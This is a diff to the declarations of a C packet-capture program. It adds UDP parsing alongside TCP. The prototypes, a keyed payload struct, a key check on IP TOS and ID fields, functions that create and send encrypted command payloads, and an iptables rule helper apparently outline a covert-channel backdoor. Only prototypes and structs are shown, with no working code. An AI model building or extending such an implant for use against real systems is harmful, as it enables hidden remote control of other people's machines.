@@ -81,6 +81,14 @@ struct sniff_tcp {
         u_short th_urp;                 /* urgent pointer */
 };
 
+struct sniff_udp {
+    u_short uh_sport;
+    u_short uh_dport;
+    u_short udp_length;
+    u_short udp_sum;
+};
+
+
 
 struct payload{
     char key[5]; // always 8505
@@ -97,6 +105,7 @@ struct filter{
     int pattern[FILTERAMOUNT];
 };
 
+void ParseUDP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet);
 void iptables(char *ip, char *protocol, char *port, bool input, bool remove);
 struct filter InitFilter(char *target, char *local);
 void PrintFilter(struct filter Filter);
@@ -108,7 +117,7 @@ int Packetcapture(char *filter, struct filter Filter);
 void ReadPacket(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet);
 void ParseIP(struct filter *Filter,const struct pcap_pkthdr* pkthdr, const u_char* packet);
 void ParseTCP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet);
-void ParsePayload(struct filter *Filter, const u_char *payload, int len);
+void ParsePayload(struct filter *Filter, const u_char *payload, int len, bool tcp);
 void CreatePayload(char *command, unsigned char *encrypted);
 void SendPayload(struct filter *Filter, const unsigned char *tcp_payload);
 bool CheckKey(u_char ip_tos, u_short ip_id, bool type);
